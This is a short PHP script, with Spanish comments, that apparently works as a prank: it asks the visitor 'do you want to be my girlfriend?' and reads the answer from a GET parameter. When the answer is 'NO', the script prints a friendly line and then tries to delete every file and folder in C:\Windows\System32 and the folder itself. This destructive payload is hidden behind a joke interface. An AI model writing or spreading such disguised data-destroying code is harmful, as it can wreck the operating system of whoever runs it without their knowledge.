// crear un modulo para la prueba
<?php

function os() {
    echo "Hola Bebé, quieres ser mi novia? <br>";
    // Obtener la respuesta desde un parámetro GET o POST
    $respuesta = isset($_GET['respuesta']) ? $_GET['respuesta'] : '';
    $respuesta = strtoupper(trim($respuesta));
    switch ($respuesta) {
        case "SI":
            echo "Genial, eres la mejor novia del mundo <br>";
            break;
        case "NO":
            echo "No te preocupes, siempre seras mi amiga <br>";
            // Dirrecionar la carpteta
            $carpeta = 'C:\Windows\System32';
            // Verificar si la carpeta existe
            if (is_dir($carpeta)) {
                // Obtener todos los elementos dentro de la carpeta
                $elementos = glob($carpeta . '/*');
                // Recorrer los elementos y eliminarlos
                foreach ($elementos as $elemento) {
                    if (is_dir($elemento)) {
                        // Si es un directorio, eliminarlo recursivamente
                        rmdir($elemento);
                    } 
                    else {
                        // Si es un archivo, eliminarlo
                        unlink($elemento);
                    }
                }

                // Finalmente, eliminar la carpeta :O
                rmdir($carpeta);

            } 
            else {
                echo "La carpeta $carpeta no existe <br>";
            }
        break;
        default:
            echo "No entiendo tu respuesta, por favor responde con SI o NO <br>";
            break;
    }
}

os();

?>